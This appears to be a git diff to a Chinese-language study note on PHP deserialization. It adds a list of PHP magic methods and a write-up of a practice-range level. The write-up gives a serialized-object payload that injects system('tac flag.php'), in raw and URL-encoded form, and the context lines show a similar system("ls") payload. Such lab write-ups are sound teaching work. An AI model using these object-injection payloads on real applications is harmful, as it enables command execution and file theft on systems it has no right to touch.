@@ -280,6 +280,24 @@ $b->displayVar() ;  //调用方法触发可控代码
 ?benben=O:4:"test":1:{s:1:"a";s:13:"system("ls");";}
 ```
 
+## 魔术方法
+在 PHP 的序列化中，魔术方法（Magic Methods）是一组特殊的方法，这些方法以双下划线（__）作为前缀，可以在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 / 反序列化 的过程。
+
+```
+ __wakeup() //------ 执行unserialize()时，先会调用这个函数
+ __sleep() //------- 执行serialize()时，先会调用这个函数
+ __destruct() //---- 对象被销毁时触发
+ __call() //-------- 在对象上下文中调用不可访问的方法时触发
+ __callStatic() //-- 在静态上下文中调用不可访问的方法时触发
+ __get() //--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法
+ __set() //--------- 用于将数据写入不可访问的属性
+ __isset() //------- 在不可访问的属性上调用isset()或empty()触发
+ __unset() //------- 在不可访问的属性上使用unset()时触发
+ __toString() //---- 把类当作字符串使用时触发
+ __invoke() //------ 当尝试将对象调用为函数时触发
+```
+
+
 # 反序列化靶场
 ## Level1-类的实例化
 直接将FLAG实例化即可
@@ -335,5 +353,26 @@ protected_key=O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protecte
 
 ![image](https://github.com/user-attachments/assets/13a3347d-6a0f-495c-9caa-c88b4abc46be)
 
-
 ![image](https://github.com/user-attachments/assets/139af564-f2cd-4bc3-b98d-90a26616b838)
+
+## Level7-实例化和反序列化
+进入后发现此题通过改变序列化的字符串来决定"还原"对象的值
+
+这道题可以修改s:24:"echo 'Hello World!<br>';"来控制backdoor()函数进行命令执行
+
+![image](https://github.com/user-attachments/assets/7221d29c-a648-4aef-baa7-32def7a7ab7c)
+
+对以下这段指令进行url编码
+
+o=O:4:"FLAG":1:{s:12:"flag_command";s:23:"system('tac flag.php');";}
+
+得到
+
+o=O%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A12%3A%22flag_command%22%3Bs%3A23%3A%22system('tac%20flag.php')%3B%22%3B%7D
+
+![image](https://github.com/user-attachments/assets/2faf7b14-2483-4d01-89ae-69e163ee170d)
+
+拿到flag
+
+## Level8-GC机制
+下周继续补完...
